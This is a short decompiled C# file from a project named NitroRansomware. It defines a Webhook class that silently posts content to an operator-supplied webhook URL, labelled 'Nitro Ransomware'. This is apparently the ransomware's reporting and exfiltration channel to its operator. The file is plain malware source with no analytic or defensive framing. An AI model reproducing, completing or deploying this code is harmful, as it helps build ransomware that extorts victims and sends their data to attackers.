using System;
using System.Collections.Generic;
using System.Net.Http;

namespace NitroRansomware;

internal class Webhook
{
	private string webhook;

	public Webhook(string userWebhook)
	{
		webhook = userWebhook;
	}

	public void Send(string content)
	{
		//IL_0034: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_0042: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Expected O, but got Unknown
		Dictionary<string, string> dictionary = new Dictionary<string, string>();
		dictionary.Add("content", content);
		dictionary.Add("username", "Nitro Ransomware");
		dictionary.Add("avatar_url", "https://i.gifer.com/1D0r.gif");
		Dictionary<string, string> dictionary2 = dictionary;
		try
		{
			HttpClient val = new HttpClient();
			try
			{
				val.PostAsync(webhook, (HttpContent)new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)dictionary2)).GetAwaiter().GetResult();
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch
		{
		}
	}
}
